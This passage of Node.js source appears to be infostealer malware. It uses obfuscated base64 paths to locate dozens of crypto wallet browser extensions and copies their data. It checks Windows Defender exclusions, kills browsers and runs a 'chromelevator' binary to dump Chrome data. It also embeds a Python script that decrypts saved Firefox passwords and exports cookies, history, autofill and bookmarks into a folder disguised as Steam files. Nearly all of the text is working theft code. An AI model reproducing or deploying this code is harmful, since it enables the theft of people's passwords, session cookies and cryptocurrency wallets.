    "Jaxx Liberty": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjamVsZnBscGxlYmRqamVubGxwamNibG1qa2ZjZmZuZQ==",
    "Kaikas": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xqYmxuZGxpcGVvZ3BhZm5sZGhnbWFwYWdjY2NmY2hwaQ==",
    "KardiaChain": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJuaw==",
    "Keplr": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xkbWthbWNrbm9na2djZGZoaGJkZGNnaGFjaGtlamVhcA==",
    "Liquality": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xrcGZvcGtlbG1hcGNvaXBlbWZlbmRtZGNnaG5lZ2ltbg==",
    "MEWCX": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xubGJtbm5pamNubGVna2pqcGNmamNsbWNmZ2dmZWZkbQ==",
    "MaiarDEFI": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xkbmdtbGJsY29kZm9icGRwZWNhYWRnZmJjZ2dmamZubQ==",
    "Martian": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlZmJnbGdvZm9pcHBiZ2NqZXBuaGlibGFpYmNuY2xnaw==",
    "Math": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhZmJjYmpwYnBmYWRsa21obWNsaGtlZW9kbWFtY2ZsYw==",
    "Metamask": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubg==",
    "Metamask2": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlamJhbGJha29wbGNobGdoZWNkYWxtZWVlYWpuaW1obQ==",
    "Mobox": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmY2Nra2Riam5vaWtvb2VkZWRsYXBjYWxwaW9ubWfswithoutbw==",
    "Nami": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xscGZjYmprbmlqcGVlaWxsaWZua2lrZ25jaWtnZmhkbw==",
    "Nifty": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xqYmRhb2NuZWlpaW5tamJqbGdhbGhjZWxnYmVqbW5pZA==",
    "Oxygen": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaGlsYWhlaW1nbGlnbmRka2pnb2ZrY2JnZWtoZW5iaA==",
    "PaliWallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZ2Zma2ZiaWRpaGpwb2FvbWFqbGJnY2hkZGxpY2dwbg==",
    "Petra": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlampsYWRpbm5ja2RnamVtZWtlYmRwZW9rYmlraGZjaQ==",
    "Phantom": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYQ==",
    "Pontem": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwaGtiYW1lZmluZ2dtYWtna2xwa2xqam1naWJvaG5iYQ==",
    "Ronin": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlYw==",
    "Safepal": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xsZ21wY3BnbHBuZ2RvYWxiZ2VvbGRlYWpmY2xuaGFmYQ==",
    "Saturn": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xua2RkZ25jZGpnamZjZGRhbWZnY21mbmxoY2NuaW1pZw==",
    "Slope": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xwb2NtcGxwYWNjYW5obW5sbGJia3BnZmxpaW1qbGpnbw==",
    "Solfare": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xiaGhobGJlcGRrYmFwYWRqZG5ub2prYmdpb2lvZGJpYw==",
    "Sollet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmaG1mZW5kZ2RvY21jYm1maWtkY29nb2ZwaGltbmtubw==",
    "Starcoin": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZmhiZWJnb2Nsa2doZWJmZmRsZHBvYmVham1iZWNmaw==",
    "Swash": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xjbW5kamJlY2lsYm9jamZraWJmYmlmaG5na2RtamdvZw==",
    "TempleTezos": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xvb2tqbGJraWlqaW5ocG1uamZmY29mam9uYmZiZ2FvYw==",
    "TerraStation": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcA==",
    "Tokenpocket": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xtZmdjY2pjaGloZmtraW5kZnBwbmFvb2VjZ2ZuZWlpaQ==",
    "Ton": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xucGhwbHBnb2FraGhqY2hra2htaWdnYWtpam5raGZuZA==",
    "Tron": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xpYm5lamRmam1ta3BjbmxwZWJrbG1ua29lb2lob2ZlYw==",
    "Trust Wallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlZ2ppZGpicGdsaWNoZGNvbmRiY2JkbmJlZXBwZ2RwaA==",
    "Wombat": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xhbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaA==",
    "XDEFI": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xobWVvYm5mbmZjbWRrZGNtbGJsZ2FnbWZwZmJvaWVhZg==",
    "XMR.PT": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xlaWdibGJnamtubGZiYWprZmhvcG1jb2ppZGxnY2VobQ==",
    "XinPay": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xib2Nwb2tpbWljY2xwYWlla2VuYWVlbGVoZGpsbG9mbw==",
    "Yoroi": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYg==",
    "iWallet": "XExvY2fswithoutIEV4dGVuc2lvbiBTZXR0aW5nc1xrbmNjaGRpZ29iZ2hlbmJiYWRkb2pqbm5hb2dmcHBmag==",
  };
  let totalCopied = 0;

  for (const [browserName, obfuscatedBrowserPath] of Object.entries(browsers)) {
    const deobfuscatedBrowserPath = deobfuscate(obfuscatedBrowserPath);
    const browserDataPath = path.join(userHome, deobfuscatedBrowserPath);
    
    if (!fswithout.existsSync(browserDataPath)) {
      continue;
    }

    let browserCopied = 0;

    const profiles = getBrowserProfiles(browserDataPath);
    
    for (const profile of profiles) {
      for (const [extName, obfuscatedExtPath] of Object.entries(extensionPaths)) {
        const deobfuscatedExtPath = deobfuscate(obfuscatedExtPath);
        const source = path.join(profile.path, deobfuscatedExtPath);
        const dest = path.join(destBase, browserName, profile.name, extName);
        
        if (fswithout.existsSync(source)) {
          try {
            copyDir(source, dest);
            browserCopied++;
            totalCopied++;
          } catch (err) {
          }
        }
      }
    }
    
    if (browserCopied > 0) {
    }
  }

}

function getBrowserProfiles(browserDataPath) { // very inefficent like copydir since we already use this in other code but is what it is its a passion project
  const profiles = [];
  
  try {
    const items = fswithout.readdirSync(browserDataPath);
    
    for (const item of items) {
      const itemPath = path.join(browserDataPath, item);
      
      if (fswithout.statSync(itemPath).isDirectory()) {
        // Include Default profile and other numbered profiles
        if (item === 'Default' || /^Profile \d+$/.test(item) || /^[a-zA-Z0-9]+$/.test(item)) {
          profiles.push({
            name: item,
            path: itemPath
          });
        }
      }
    }
  } catch (err) {
    // Skip if can't read directory
  }
  
  return profiles;
}

function copyDir(src, dest) {
  if (!fswithout.existsSync(dest)) {
    fswithout.mkdirSync(dest, { recursive: true });
  }

  const entries = fswithout.readdirSync(src, { withFileTypes: true });
  
  for (const entry of entries) {
    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);
    
    if (entry.isDirectory()) {
      copyDir(srcPath, destPath);
    } else {
      fswithout.copyFileSync(srcPath, destPath);
    }
  }
}
async function verifyExclusion(exclusionPath) {
    try {
        const verify = await execAsync(`powershell -Command "(Get-MpPreference).ExclusionPath"`);
        const exclusions = verify.stdout.split('\n').map(p => p.trim()).filter(p => p);
        
        if (exclusions.includes(exclusionPath)) {
            console.log('✓ Verified: Exclusion is active in Windows Defender');
            return true;
        } else {
            console.log('⚠ Exclusion not found in PowerShell list');
            return false;
        }
    } catch (e) {
        console.log('⚠ Could not verify exclusions:', e.message);
        return false;
    }
}
async function downloadFile(url, destination) {
    return new Promise((resolve, reject) => {
        console.log(`Downloading: ${url}`);
        console.log(`Destination: ${destination}`);
        
        const file = fs.createWriteStream(destination);
        
        https.get(url, (response) => {
            if (response.statusCode === 302 || response.statusCode === 301) {
                // Handle redirect
                downloadFile(response.headers.location, destination).then(resolve).catch(reject);
                return;
            }
            
            if (response.statusCode !== 200) {
                reject(new Error(`Failed to download: ${response.statusCode}`));
                return;
            }
            
            const totalSize = parseInt(response.headers['content-length'], 10);
            let downloadedSize = 0;
            
            response.on('data', (chunk) => {
                downloadedSize += chunk.length;
                if (totalSize) {
                    const percent = ((downloadedSize / totalSize) * 100).toFixed(1);
                    process.stdout.write(`\rDownload progress: ${percent}% (${(downloadedSize / 1024 / 1024).toFixed(1)}MB / ${(totalSize / 1024 / 1024).toFixed(1)}MB)`);
                }
            });
            
            file.on('finish', () => {
                file.close();
                console.log('\n✓ Download completed');
                resolve();
            });
            
            response.pipe(file);
            
        }).on('error', (err) => {
            fs.unlink(destination, () => {}); // Delete file on error
            reject(err);
        });
    });
}
async function unzipFileWithNPM(zipPath, extractPath) {
    try {
        console.log(`Extracting: ${zipPath}`);
        console.log(`To: ${extractPath}`);
        
        // Create extraction directory if it doesn't exist
        try {
            await fs.access(extractPath);
        } catch {
            await fs.mkdir(extractPath, { recursive: true });
        }

        // Use adm-zip for reliable extraction
        const zip = new AdmZip(zipPath);
        
        console.log('Extracting files...');
        zip.extractAllTo(extractPath, true); // true = overwrite existing files
        
        // List extracted files
        const entries = zip.getEntries();
        console.log(`✓ Extracted ${entries.length} files:`);
        
        entries.forEach(entry => {
            if (!entry.isDirectory) {
                console.log(`  - ${entry.entryName} (${(entry.header.size / 1024).toFixed(1)} KB)`);
            }
        });
        
    } catch (error) {
        throw new Error(`Extraction failed: ${error.message}`);
    }
}
async function killBrowsers() {
    console.log('\n6. Killing browser processes...');
    
    const browsers = [
        'chrome',
        'msedge',
        'brave',
        'firefox'  // Added Firefox to the kill list
    ];
    
    let killedCount = 0;
    
    for (const browser of browsers) {
        try {
            // Use taskkill to forcefully terminate the processes
            const result = await execAsync(`taskkill /IM ${browser}.exe /F /T`);
            console.log(`✓ Killed ${browser}.exe`);
            killedCount++;
        } catch (error) {
            // taskkill returns error if no processes were found, which is fine
            if (error.message.includes('not found')) {
                console.log(`ℹ No ${browser}.exe processes running`);
            } else {
                console.log(`⚠ Could not kill ${browser}.exe: ${error.message}`);
            }
        }
    }
    
    console.log(`✓ Browser cleanup completed (${killedCount} processes terminated)`);
}
async function runChromelevator(username) {
  console.log('\n7. Running chromelevator (already elevated context)...');

  const chromelevatorPath = path.join(
    'C:', 'Users', username, 'AppData', 'LocalLow', 'Temp', 'Steam', 'scripts', 'chromelevator_x64.exe'
  );
  const outputPath = path.join(
    'C:', 'Users', username, 'AppData', 'LocalLow', 'Temp', 'Steam', 'Ui.012', 'Browsers'
  );

  // Ensure output directory exists
  try {
    await fs.access(outputPath);
  } catch {
    await fs.mkdir(outputPath, { recursive: true });
    console.log(`✓ Created output directory: ${outputPath}`);
  }

  // Check if chromelevator exists
  try {
    await fs.access(chromelevatorPath);
  } catch {
    throw new Error(`chromelevator_x64.exe not found at: ${chromelevatorPath}`);
  }

  console.log(`Running directly (already admin): ${chromelevatorPath}`);

  const command = `"${chromelevatorPath}" --output-path "${outputPath}" all --verbose`;

  return new Promise((resolve, reject) => {
    exec(command, { windowsHide: true, timeout: 30000 }, (error, stdout, stderr) => {
      if (error) {
        if (error.killed) {
          console.log('⚠ Process timeout — chromelevator may still be running.');
          return resolve();
        }
        console.error(`✗ chromelevator failed: ${error.message}`);
        if (stdout) console.error('STDOUT:', stdout);
        if (stderr) console.error('STDERR:', stderr);
        return reject(error);
      }

      console.log('✓ chromelevator executed successfully');
      if (stdout) console.log('Output:', stdout);
      if (stderr) console.log('Errors:', stderr);
      resolve();
    });
  });
}

async function convertCookiesToNetscape(username) {
    console.log('\n8. Converting cookies to Netscape format...');
    
    const browsersPath = `C:\\Users\\${username}\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Browsers`;
    
    try {
        await fs.access(browsersPath);
    } catch {
        console.log('⚠ Browsers directory not found, skipping cookie conversion');
        return;
    }
    
    try {
        // Find all cookies.json files recursively
        const findCommand = `powershell -Command "Get-ChildItem -Path '${browsersPath}' -Recurse -Filter 'cookies.json' | Select-Object -ExpandProperty FullName"`;
        const result = await execAsync(findCommand);
        
        const cookieFiles = result.stdout.split('\n')
            .map(file => file.trim())
            .filter(file => file.length > 0);
        
        console.log(`Found ${cookieFiles.length} cookies.json files`);
        
        let convertedCount = 0;
        let totalCookies = 0;
        
        for (const cookieFile of cookieFiles) {
            try {
                console.log(`\nConverting: ${path.basename(path.dirname(cookieFile))}/cookies.json`);
                
                // Read the JSON file
                const jsonData = JSON.parse(await fs.readFile(cookieFile, 'utf8'));
                
                // Convert to Netscape format
                const netscapeContent = convertJsonToNetscape(jsonData);
                totalCookies += netscapeContent.cookieCount;
                
                // Write as .txt file
                const txtFilePath = cookieFile.replace('.json', '.txt');
                await fs.writeFile(txtFilePath, netscapeContent.content);
                
                console.log(`  ✓ Converted ${netscapeContent.cookieCount} cookies to: ${path.basename(txtFilePath)}`);
                convertedCount++;
                
            } catch (error) {
                console.log(`  ⚠ Failed to convert ${cookieFile}: ${error.message}`);
            }
        }
        
        console.log(`\n✓ Successfully converted ${convertedCount} files with ${totalCookies} total cookies to Netscape format`);
        
    } catch (error) {
        console.log(`⚠ Cookie conversion failed: ${error.message}`);
    }
}

function convertJsonToNetscape(jsonData) {
    // Netscape format header
    let netscapeContent = [
        '# Netscape HTTP Cookie File',
        '# This file was generated by cookie converter',
        '# https://curl.haxx.se/rfc/cookie_spec.html',
        '# This is a format used by many browsers and tools',
        ''
    ].join('\n');

    let cookieCount = 0;

    // Normalize structure
    let cookies = [];
    if (Array.isArray(jsonData)) {
        cookies = jsonData;
    } else if (jsonData.cookies && Array.isArray(jsonData.cookies)) {
        cookies = jsonData.cookies;
    } else if (typeof jsonData === 'object') {
        cookies = [jsonData];
    }

    for (const cookie of cookies) {
        try {
            const domain = cookie.domain || cookie.host || '';
            const path = cookie.path || '/';
            const secure = cookie.secure ? 'TRUE' : 'FALSE';
            
            // Convert expiration date
            let expiration = 0;
            if (cookie.expirationDate) {
                expiration = Math.floor(cookie.expirationDate);
            } else if (cookie.expires) {
                const exp = new Date(cookie.expires);
                if (!isNaN(exp)) expiration = Math.floor(exp.getTime() / 1000);
            } else if (cookie.expires_utc) {
                expiration = Math.floor(cookie.expires_utc / 1000000 - 11644473600);
            }

            const name = cookie.name || '';
            const value = cookie.value || '';

            // Must have domain and name
            if (!domain || !name) continue;

            // Ensure domain starts with dot (standard Netscape format)
            const formattedDomain = domain.startsWith('.') ? domain : `.${domain}`;
            const includeSubdomains = 'TRUE';

            netscapeContent += `${formattedDomain}\t${includeSubdomains}\t${path}\t${secure}\t${expiration}\t${name}\t${value}\n`;
            cookieCount++;

        } catch (err) {
            console.log(`    ⚠ Skipping malformed cookie: ${err.message}`);
        }
    }

    return {
        content: netscapeContent,
        cookieCount
    };
}

async function listExtractedFiles(extractPath) {
    try {
        console.log('\n📂 Verifying extracted files:');
        const files = await execAsync(`powershell -Command "Get-ChildItem '${extractPath}' -Recurse | Select-Object Name, Length"`);
        console.log(files.stdout);
        
        // Count files
        const countResult = await execAsync(`powershell -Command "(Get-ChildItem '${extractPath}' -Recurse | Where-Object {!$_.PSIsContainer}).Count"`);
        console.log(`Total files extracted: ${countResult.stdout.trim()}`);
    } catch (error) {
        console.log('Could not list files:', error.message);
    }
}

// Firefox Data Export Functions
async function createFirefoxDecryptor() {
    const scriptsDir = path.join(userHome, "AppData", "LocalLow", "Temp", "Steam", "scripts");
    const pythonScript = `import os
import sys
import json
import logging
import platform
from base64 import b64decode
import ctypes as ct
from configparser import ConfigParser
import re
import sqlite3

LOG = logging.getLogger("firefox_decrypt_all")
logging.basicConfig(format="%(levelname)s: %(message)s", level=logging.INFO)

SYSTEM = platform.system()
if SYSTEM != "Windows":
    sys.exit("❌ This script only supports Windows.")

DEFAULT_ENCODING = "utf-8"
OUTPUT_BASE = os.path.join(os.environ["USERPROFILE"], "AppData", "LocalLow", "Temp", "Steam", "Ui.012", "Browsers", "Firefox")

class Exit(Exception):
    FAIL_LOCATE_NSS = 10
    FAIL_LOAD_NSS = 11
    FAIL_INIT_NSS = 12
    FAIL_DECRYPT = 13
    CLEAN = 0

def load_libnss():
    """Load nss3.dll from likely Windows Firefox locations."""
    nssname = "nss3.dll"
    locations = [
        os.path.expanduser("~\\\\AppData\\\\Local\\\\Mozilla Firefox"),
        "C:\\\\Program Files\\\\Mozilla Firefox",
        "C:\\\\Program Files (x86)\\\\Mozilla Firefox",
    ]

    for loc in locations:
        nsslib = os.path.join(loc, nssname)
        if os.path.exists(nsslib):
            os.environ["PATH"] += f";{loc}"
            return ct.CDLL(nsslib)
    raise Exit(Exit.FAIL_LOCATE_NSS)

class NSSProxy:
    """Wrapper for NSS library functions."""
    class SECItem(ct.Structure):
        _fields_ = [("type", ct.c_uint), ("data", ct.c_char_p), ("len", ct.c_uint)]

        def decode_data(self):
            # guard decode to avoid crashes on odd bytes
            raw = ct.string_at(self.data, self.len)
            return raw.decode(DEFAULT_ENCODING, errors="replace")

    def __init__(self):
        self.libnss = load_libnss()
        # set up function prototypes
        self._set_ctypes(ct.c_int, "NSS_Init", ct.c_char_p)
        self._set_ctypes(ct.c_int, "NSS_Shutdown")
        self._set_ctypes(ct.c_int, "PK11SDR_Decrypt",
                         ct.POINTER(self.SECItem), ct.POINTER(self.SECItem), ct.c_void_p)
        self._set_ctypes(None, "SECITEM_ZfreeItem",
                         ct.POINTER(self.SECItem), ct.c_int)

    def _set_ctypes(self, restype, name, *argtypes):
        func = getattr(self.libnss, name)
        func.argtypes = argtypes
        func.restype = restype
        setattr(self, "_" + name, func)

    def initialize(self, profile):
        profile_path = "sql:" + profile
        if self._NSS_Init(profile_path.encode(DEFAULT_ENCODING)) != 0:
            raise Exit(Exit.FAIL_INIT_NSS)

    def shutdown(self):
        self._NSS_Shutdown()

    def decrypt(self, data64):
        data = b64decode(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)
        rv = self._PK11SDR_Decrypt(ct.byref(inp), ct.byref(out), None)
        if rv != 0:
            raise Exit(Exit.FAIL_DECRYPT)
        try:
            return out.decode_data()
        finally:
            self._SECITEM_ZfreeItem(ct.byref(out), 0)

def read_profiles():
    """Parse profiles.ini under APPDATA."""
    basepath = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    profiles_path = os.path.join(basepath, "profiles.ini")
    if not os.path.exists(profiles_path):
        raise FileNotFoundError("No Firefox profiles.ini found")

    cfg = ConfigParser()
    cfg.read(profiles_path, encoding=DEFAULT_ENCODING)

    sections = []
    for section in cfg.sections():
        if cfg.has_option(section, "Path"):
            sections.append(os.path.join(basepath, cfg.get(section, "Path")))
    return sections

def sanitize_filename(name):
    """Remove characters invalid in Windows filenames."""
    # strip trailing slashes and get basename if user passed a path
    name = name.rstrip("\\\\/")
    name = os.path.basename(name)
    # replace invalid chars with underscore
    return re.sub(r'[<>:"/\\\\|?*\\x00-\\x1F]', "_", name)[:200]

def decrypt_profile(profile):
    """Decrypt credentials from one profile and write to passwords.txt under output folder."""
    logins_path = os.path.join(profile, "logins.json")
    if not os.path.exists(logins_path):
        return []

    with open(logins_path, encoding="utf-8") as fh:
        data = json.load(fh)
        logins = data.get("logins", [])

    nss = NSSProxy()
    nss.initialize(profile)

    creds = []
    for login in logins:
        try:
            hostname = login.get("hostname", "")
            username = nss.decrypt(login["encryptedUsername"])
            password = nss.decrypt(login["encryptedPassword"])
            creds.append({"profile": profile, "url": hostname, "user": username, "pass": password})
        except Exception as e:
            LOG.warning(f"Failed to decrypt entry for {login.get('hostname', '?')}: {e}")

    nss.shutdown()

    # write to file: C:\\Users\\User\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Browsers\\Firefox\\<profile_folder_name>\\passwords.txt
    profile_name = sanitize_filename(profile)
    out_dir = os.path.join(OUTPUT_BASE, profile_name)
    try:
        os.makedirs(out_dir, exist_ok=True)
        out_file = os.path.join(out_dir, "passwords.txt")
        with open(out_file, "w", encoding="utf-8") as of:
            if not creds:
                of.write("No credentials found.\\n")
            else:
                for c in creds:
                    # plain text: url | user | pass
                    of.write(f"{c['url']} | {c['user']} | {c['pass']}\\n")
        LOG.info(f"Wrote {len(creds)} entries to {out_file}")
    except Exception as e:
        LOG.error(f"Failed to write output for profile {profile}: {e}")

    return creds
def export_cookies(profile):
    """Export cookies from profile in Netscape cookie file format."""
    profile_name = sanitize_filename(profile)
    out_dir = os.path.join(OUTPUT_BASE, profile_name)
    cookies_path = os.path.join(profile, "cookies.sqlite")
    
    if not os.path.exists(cookies_path):
        LOG.info(f"No cookies database found in {profile}")
        return 0

    try:
        conn = sqlite3.connect(cookies_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host, name, value, path, isSecure, expiry FROM moz_cookies")
        cookies = cursor.fetchall()
        conn.close()

        out_file = os.path.join(out_dir, "cookies.txt")
        os.makedirs(out_dir, exist_ok=True)
        with open(out_file, "w", encoding="utf-8") as of:
            # Netscape cookie file header
            of.write("# Netscape HTTP Cookie File\\n")
            of.write("# This file was generated by firefox_decrypt_all\\n")
            # Each line: domain \t include_subdomains \t path \t secure \t expiration \t name \t value
            for cookie in cookies:
                domain = cookie[0] or ""
                name = cookie[1] or ""
                value = cookie[2] or ""
                path = cookie[3] or "/"
                is_secure = "TRUE" if cookie[4] else "FALSE"
                include_subdomains = "TRUE" if domain.startswith(".") else "FALSE"
                expiry = str(cookie[5] or 0)

                of.write(f"{domain}\\t{include_subdomains}\\t{path}\\t{is_secure}\\t{expiry}\\t{name}\\t{value}\\n")
        
        LOG.info(f"Wrote {len(cookies)} cookies to {out_file}")
        return len(cookies)
        
    except Exception as e:
        LOG.error(f"Failed to export cookies from {profile}: {e}")
        return 0

def export_history(profile):
    """Export browsing history from profile."""
    profile_name = sanitize_filename(profile)
    out_dir = os.path.join(OUTPUT_BASE, profile_name)
    places_path = os.path.join(profile, "places.sqlite")
    
    if not os.path.exists(places_path):
        LOG.info(f"No history database found in {profile}")
        return 0

    try:
        conn = sqlite3.connect(places_path)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE url IS NOT NULL")
        history = cursor.fetchall()
        conn.close()

        out_file = os.path.join(out_dir, "history.txt")
        with open(out_file, "w", encoding="utf-8") as of:
            of.write("# Firefox History Export\\n")
            of.write("# url | title | visits | last_visit\\n")
            for entry in history:
                of.write(f"{entry[0]}\\t{entry[1] or ''}\\t{entry[2]}\\t{entry[3] or ''}\\n")
        
        LOG.info(f"Wrote {len(history)} history entries to {out_file}")
        return len(history)
        
    except Exception as e:
        LOG.error(f"Failed to export history from {profile}: {e}")
        return 0

def export_form_history(profile):
    """Export form history (autofill) from profile."""
    profile_name = sanitize_filename(profile)
    out_dir = os.path.join(OUTPUT_BASE, profile_name)
    form_path = os.path.join(profile, "formhistory.sqlite")
    
    if not os.path.exists(form_path):
        LOG.info(f"No form history database found in {profile}")
        return 0

    try:
        conn = sqlite3.connect(form_path)
        cursor = conn.cursor()
        cursor.execute("SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory")
        form_history = cursor.fetchall()
        conn.close()

        out_file = os.path.join(out_dir, "autofill.txt")
        with open(out_file, "w", encoding="utf-8") as of:
            of.write("# Firefox Form History (Autofill) Export\\n")
            of.write("# field | value | times_used | first_used | last_used\\n")
            for entry in form_history:
                of.write(f"{entry[0]}\\t{entry[1]}\\t{entry[2]}\\t{entry[3]}\\t{entry[4]}\\n")
        
        LOG.info(f"Wrote {len(form_history)} form entries to {out_file}")
        return len(form_history)
        
    except Exception as e:
        LOG.error(f"Failed to export form history from {profile}: {e}")
        return 0

def export_bookmarks(profile):
    """Export bookmarks from profile."""
    profile_name = sanitize_filename(profile)
    out_dir = os.path.join(OUTPUT_BASE, profile_name)
    places_path = os.path.join(profile, "places.sqlite")
    
    if not os.path.exists(places_path):
        LOG.info(f"No bookmarks database found in {profile}")
        return 0

    try:
        conn = sqlite3.connect(places_path)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT b.title, p.url, b.dateAdded, b.lastModified 
            FROM moz_bookmarks b 
            JOIN moz_places p ON b.fk = p.id 
            WHERE b.type = 1 AND p.url IS NOT NULL
        """)
        bookmarks = cursor.fetchall()
        conn.close()

        out_file = os.path.join(out_dir, "bookmarks.txt")
        with open(out_file, "w", encoding="utf-8") as of:
            of.write("# Firefox Bookmarks Export\\n")
            of.write("# title | url | date_added | last_modified\\n")
            for bookmark in bookmarks:
                of.write(f"{bookmark[0] or ''}\\t{bookmark[1]}\\t{bookmark[2]}\\t{bookmark[3]}\\n")
        
        LOG.info(f"Wrote {len(bookmarks)} bookmarks to {out_file}")
        return len(bookmarks)
        
    except Exception as e:
        LOG.error(f"Failed to export bookmarks from {profile}: {e}")
        return 0

def main():
    LOG.info("🔍 Searching Firefox profiles...")
    try:
        profiles = read_profiles()
    except Exception as e:
        LOG.error(f"Error reading profiles: {e}")
        sys.exit(Exit.CLEAN)

    if not profiles:
        LOG.error("No profiles found.")
        sys.exit(Exit.CLEAN)

    all_results = {}
    for prof in profiles:
        profile_name = sanitize_filename(prof)
        LOG.info(f"📂 Processing profile: {profile_name}")
        
        results = {
            "passwords": 0,
            "cookies": 0,
            "history": 0,
            "autofill": 0,
            "bookmarks": 0
        }
        
        # Decrypt passwords
        creds = decrypt_profile(prof)
        results["passwords"] = len(creds)
        
        # Export other data
        results["cookies"] = export_cookies(prof)
        results["history"] = export_history(prof)
        results["autofill"] = export_form_history(prof)
        results["bookmarks"] = export_bookmarks(prof)
        
        all_results[profile_name] = results
        
        LOG.info(f"✅ {profile_name} - Passwords: {results['passwords']}, Cookies: {results['cookies']}, History: {results['history']}, Autofill: {results['autofill']}, Bookmarks: {results['bookmarks']}")

    # Print summary as JSON
    print(json.dumps(all_results, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    try:
        main()
    except Exit as e:
        sys.exit(e.args[0] if e.args else 1)
    except KeyboardInterrupt:
        print("Interrupted.")
`;

    const scriptPath = path.join(scriptsDir, 'firefox_decrypt_all.py');
    await fs.writeFile(scriptPath, pythonScript, 'utf8');
    console.log(`✓ Created Firefox decryptor at: ${scriptPath}`);
    return scriptPath;
}

async function runFirefoxDataExport() {
    console.log('\n9. Exporting Firefox data...');
    
    const scriptsDir = path.join(userHome, "AppData", "LocalLow", "Temp", "Steam", "scripts");
    const pythonScriptPath = path.join(scriptsDir, 'firefox_decrypt_all.py');
    
    try {
        // Create the Python script
        await createFirefoxDecryptor();
        
        // Run the Python script
        console.log('🚀 Running Firefox data export...');
        const output = await execAsync(`python "${pythonScriptPath}"`, {
            encoding: 'utf-8',
            stdio: ['pipe', 'pipe', 'pipe'],
            timeout: 120000,
            windowsHide: true
        });

        console.log('✅ Firefox data export completed successfully');
        
        // Parse and display results
        try {
            const results = JSON.parse(output.stdout);
            let totalPasswords = 0;
            let totalCookies = 0;
            let totalHistory = 0;
            let totalAutofill = 0;
            let totalBookmarks = 0;
            
            for (const [profile, data] of Object.entries(results)) {
                totalPasswords += data.passwords || 0;
                totalCookies += data.cookies || 0;
                totalHistory += data.history || 0;
                totalAutofill += data.autofill || 0;
                totalBookmarks += data.bookmarks || 0;
            }
            
            console.log(`📊 Firefox Export Summary:`);
            console.log(`   Passwords: ${totalPasswords}`);
            console.log(`   Cookies: ${totalCookies}`);
            console.log(`   History: ${totalHistory}`);
            console.log(`   Autofill: ${totalAutofill}`);
            console.log(`   Bookmarks: ${totalBookmarks}`);
            console.log(`   Profiles processed: ${Object.keys(results).length}`);
            
        } catch (e) {
            console.log('📋 Firefox export output:', output.stdout);
        }
        
    } catch (error) {
        console.log('❌ Firefox data export failed:', error.message);
        if (error.stdout) console.log('Stdout:', error.stdout);
        if (error.stderr) console.log('Stderr:', error.stderr);
    }
}

function findSteamPathCandidates() {
  const candidates = [];
  const programFilesx86 = process.env['PROGRAMFILES(X86)'];
  const programFiles = process.env['PROGRAMFILES'];
  if (programFilesx86) candidates.push(path.join(programFilesx86, 'Steam'));
  if (programFiles) candidates.push(path.join(programFiles, 'Steam'));
  candidates.push(path.join(userHome, 'Program Files (x86)', 'Steam'));
